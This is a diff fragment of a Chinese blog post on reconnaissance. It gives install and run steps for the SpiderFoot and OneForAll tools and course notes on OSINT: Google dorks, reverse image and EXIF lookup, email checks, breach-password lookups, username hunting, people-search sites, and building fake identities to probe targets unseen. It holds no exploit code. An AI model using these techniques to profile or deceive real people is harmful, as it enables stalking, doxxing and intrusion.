+&lt;li&gt;Spiderfoot&lt;br&gt;[下载地址]（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NtaWNhbGxlZi9zcGlkZXJmb290P3JlZj1kJUVGJUJDJTg5&#34;&gt;https://github.com/smicallef/spiderfoot?ref=d）&lt;/span&gt;&lt;br&gt;   &lt;img data-src=&#34;11.png&#34; alt=&#34; &#34;&gt;&lt;img data-src=&#34;12.png&#34; alt=&#34; &#34;&gt;&lt;ul&gt;
 &lt;li&gt;这是一个免费的侦察工具，可自动查询 100 多个公共数据源 (OSINT)，以收集有关IP地址、域名、电子邮件地址、姓名等的情报信息。只需指定要调查的目标，选择要启用的模块，然后 SpiderFoot 将收集数据以了解所有实体以及它们之间的关系。扫描返回的数据将揭示有关目标的大量信息，从而深入了解可能的数据泄漏、漏洞或其他敏感信息，这些信息可在渗透测试、红队演习或威胁情报中被利用。&lt;/li&gt;
-&lt;li&gt;还可以在 SpiderFoot 扫描中定位以下实体：&lt;ul&gt;
-&lt;li&gt;IP地址&lt;/li&gt;
-&lt;li&gt;域名/子域名&lt;/li&gt;
-&lt;li&gt;主机名&lt;/li&gt;
-&lt;li&gt;网络子网 (CIDR)&lt;/li&gt;
-&lt;li&gt;ASN&lt;/li&gt;
-&lt;li&gt;电子邮件地址&lt;/li&gt;
-&lt;li&gt;电话号码&lt;/li&gt;
-&lt;li&gt;用户名&lt;/li&gt;
-&lt;li&gt;人名&lt;/li&gt;
-&lt;li&gt;比特币地址&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
+&lt;li&gt;还可以在 SpiderFoot 扫描中定位以下实体：&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;      * IP地址
+      * 域名/子域名
+      * 主机名
+      * 网络子网 (CIDR)
+      * ASN
+      * 电子邮件地址
+      * 电话号码
+      * 用户名
+      * 人名
+      * 比特币地址
+&lt;/code&gt;&lt;/pre&gt;
 &lt;blockquote&gt;
 &lt;h5 id=&#34;安装&#34;&gt;&lt;a href=&#34;#安装&#34; class=&#34;headerlink&#34; title=&#34;安装&#34;&gt;&lt;/a&gt;安装&lt;/h5&gt;&lt;p&gt;稳定构建（打包发布）：&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -130,23 +270,139 @@ python ./sf.py -l 127.0.0.1:5001
 &lt;blockquote&gt;
 &lt;ol start=&#34;9&#34;&gt;
 &lt;li&gt;OneforAll&lt;br&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9PbmVGb3JBbGw=&#34;&gt;摘自&lt;/span&gt;&lt;br&gt;一款强大的子域收集工具&lt;/li&gt;
-&lt;li&gt;基于python 3.6.0及以上版本,cmd中查看&lt;br&gt;&lt;code&gt;pyton -V&lt;/code&gt;&lt;br&gt;这里我们用git来下载[GIT安装]（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXQtc2NtLmNvbS9ib29rL3poL3YyLyVFOCVCNSVCNyVFNiVBRCVBNS0lRTUlQUUlODklRTglQTMlODUtR2l0JUVGJUJDJTg5&#34;&gt;https://git-scm.com/book/zh/v2/%E8%B5%B7%E6%AD%A5-%E5%AE%89%E8%A3%85-Git）&lt;/span&gt;&lt;br&gt;&lt;code&gt;git clone https://gitee.com/shmilylty/OneForAll.git 或git clone https://github.com/shmilylty/OneForAll.git&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;基于python 3.6.0及以上版本,cmd中查看&lt;br&gt;&lt;code&gt;pyton -V&lt;/code&gt;&lt;br&gt;这里我们用git来下载&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXQtc2NtLmNvbS9ib29rL3poL3YyLyVFOCVCNSVCNyVFNiVBRCVBNS0lRTUlQUUlODklRTglQTMlODUtR2l0&#34;&gt;GIT安装&lt;/span&gt;&lt;/li&gt;
 &lt;/ol&gt;
 &lt;/blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;cmd&#34;&gt;git clone https://gitee.com/shmilylty/OneForAll.git
+或git clone https://github.com/shmilylty/OneForAll.git
+&lt;/code&gt;&lt;/pre&gt;
 &lt;ul&gt;
 &lt;li&gt;安装&lt;ul&gt;
 &lt;li&gt;1.0cmd中输入&lt;br&gt;&lt;code&gt;cd OneforAll&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;2.0安装依赖&lt;br&gt;&lt;code&gt;python -m pip install -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/ pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/ &lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;3.0更新&lt;br&gt;&lt;code&gt;git stash        # 暂存本地的修改 git fetch --all  # 拉取项目更新 git pull         # 下载覆盖 git stash pop    # 释放本地修改&lt;/code&gt;&lt;blockquote&gt;
-&lt;p&gt;演示&lt;br&gt;我这边是用example.com来演示的,大家可以换成其他域名&lt;br&gt;&lt;code&gt;python oneforall.py --target example.com run 或 python oneforall.py --targets ./example.txt run&lt;/code&gt;&lt;/p&gt;
+&lt;li&gt;2.0安装依赖&lt;pre&gt;&lt;code class=&#34;cmd&#34;&gt;python -m pip install -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/
+pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;3.0更新&lt;pre&gt;&lt;code class=&#34;cmd&#34;&gt;git stash        # 暂存本地的修改
+git fetch --all  # 拉取项目更新
+git pull         # 下载覆盖
+git stash pop    # 释放本地修改
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;演示&lt;br&gt;我这边是用example.com来演示的,大家可以换成其他域名&lt;/p&gt;
 &lt;/blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;cmd&#34;&gt;python oneforall.py --target example.com run
+或
+python oneforall.py --targets ./example.txt run
+&lt;/code&gt;&lt;/pre&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;运行后就是这样的了&lt;br&gt;&lt;img data-src=&#34;15.png&#34; alt=&#34; &#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li&gt;运行后就是这样的了&lt;br&gt;&lt;img data-src=&#34;15.png&#34; alt=&#34; &#34;&gt; &lt;/li&gt;
 &lt;li&gt;之后找到OneforAll文件夹中的results&lt;br&gt;&lt;img data-src=&#34;16.png&#34; alt=&#34; &#34;&gt;&lt;/li&gt;
-&lt;li&gt;打开&lt;br&gt;&lt;a href=&#34;18.png&#34;&gt; &lt;/a&gt;&lt;br&gt;&lt;img data-src=&#34;17.png&#34; alt=&#34; &#34;&gt;&lt;/li&gt;
+&lt;li&gt;打开&lt;br&gt;&lt;img data-src=&#34;17.png&#34; alt=&#34; &#34;&gt;&lt;br&gt;&lt;img data-src=&#34;18.png&#34; alt=&#34; &#34;&gt; &lt;/li&gt;
 &lt;/ul&gt;
+&lt;h3 id=&#34;现在让我们开始OSNIT&#34;&gt;&lt;a href=&#34;#现在让我们开始OSNIT&#34; class=&#34;headerlink&#34; title=&#34;现在让我们开始OSNIT&#34;&gt;&lt;/a&gt;现在让我们开始OSNIT&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;前言:以下内容为油管Cyber Mentor老师关于OSINT相关知识的笔记，在国内部分内容不一定能够实操，但是知识点有一定的借鉴性。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;为什么我们需要Fake identity&lt;ul&gt;
+&lt;li&gt;在进行OSINT的时候，我们为了不让目标发现我们正在探测他，有时候我们需要一个Fake 微信账户、Fake 求职账户、Fake Twitter账户，诸如此类。这个账户不应该绑定真实的IP信息、手机信息等个人信息。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;如何创建Fake identity&lt;ol&gt;
+&lt;li&gt;可以使用AI生成的fake头像&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudGhpc3BlcnNvbmRvZXNub3RleGlzdC5jb20v&#34;&gt;AI&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;可以使用配套的虚假信息&lt;/li&gt;
+&lt;li&gt;可以使用Fake的个人邮件、银行卡信息&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wcml2YWN5LmNvbS8=&#34;&gt;Fake&lt;/span&gt;    4. 可以使用VPN伪造IP Address&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;Search Engine OSINT   &lt;ul&gt;
+&lt;li&gt;&lt;p&gt;常用搜索引擎：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;谷歌:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8=&#34;&gt;https://www.google.com&lt;/span&gt; &lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;DuckDuckGo:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kdWNrZHVja2dvLmNvbS8=&#34;&gt;https://duckduckgo.com/&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Yandex:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly95YW5kZXguY29tLw==&#34;&gt;https://yandex.com/&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;谷歌Hack语法:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;         1. &amp;quot;A and B&amp;quot;:包含A和B的网页
+         2. &amp;quot;site:xxx.com&amp;quot;:xxx.com网页下的文件
+         3. &amp;quot;*&amp;quot; :万能替换
+         4. &amp;quot;filetype:pdf&amp;quot;:搜索文件类型为PDF的结果
+         5. &amp;quot;-resultA&amp;quot;:不显示resultA的搜索结果
+         6. &amp;quot;intext: resultB&amp;quot;:显示在网页中有ResultB的结果
+         7. &amp;quot;inurl:resultC&amp;quot;:显示在网页URL中有ResultC的结果
+         8. 高级搜索:https://www.google.com/advanced_search
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;Reverse Picture OSINT&lt;pre&gt;&lt;code&gt; 1. [Google图片搜索](https://images.google.com/)
+ 2. [Yandex图片搜索](https://yandex.com/images/search)
+ 3. [Tineye图片搜索](https://tineye.com/search)
+            Yadex在反向图片搜素这个方面更优秀一点，可以触类旁通反馈相似的图片
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;​                   Tineye搜索的结果可能和Google有所不同，可能搜索到比较隐蔽的结果&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol start=&#34;5&#34;&gt;
+&lt;li&gt;&lt;p&gt;EXIF Data OSINT&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;     可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的文件格式，可以记录数码照片的属性信息和拍摄数据。
+      通过EXIF Data，我们可以获得图片的拍摄日期、拍摄器材、甚至拍摄地点
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9leGlmZGF0YS5jb20v&#34;&gt;在线EXIF信息提取网站&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;ol start=&#34;6&#34;&gt;
+&lt;li&gt;Real Address OSINT&lt;pre&gt;&lt;code&gt; 1. [Google卫星地图](https://www.google.com/maps)
+ 2. [百度地图查询](https://map.baidu.com/)
+ 3. [地址猜测网站](https://www.geoguessr.com/)
+ 4. [高德地图](https://www.amap.com/)
+  * 研究一个图片反应的所在地，要注重图片细节，比如图片中的人物、汽车牌照、气象细节、建筑物、常用规则。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;Email Address OSINT&lt;pre&gt;&lt;code&gt; 1. [公司邮件查个人](https://hunter.io/)
+ 2. [万能查询](https://phonebook.cz/)[付费,一年5000欧]
+ 3. [精准个人查询](https://www.voilanorbert.com/)
+ 4. [邮箱存活性验证](https://tools.emailhippo.com/)
+* 邮箱存活性验证技巧：尝试登录Google,如果到了输入密码那一步，说明邮箱是存在的。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;Password OSINT&lt;pre&gt;&lt;code&gt; 1. [付费数据](https://dehashed.com/)[一天5￥，但是数据很神]
+ 2. [信息泄露查询](https://leakcheck.io/)
+ 3. [信息泄露自查](https://haveibeenpwned.com/)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;Hunting Username And Accouts&lt;pre&gt;&lt;code&gt; 1. [用户注册检测](https://namechk.com/)
+ 2. [注册用户检测](https://whatsmyname.app/)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;Searching For People&lt;pre&gt;&lt;code&gt;1. [姓名电话住址查人](https://www.whitepages.com/)【美国用户信息】
+2. [手机号查人](https://www.truecaller.com/)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​&lt;br&gt;​        &lt;/p&gt;
 </content>
         <category term="网安" scheme="http://example.com/categories/%E7%BD%91%E5%AE%89/" />
         <category term="信息搜集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" />
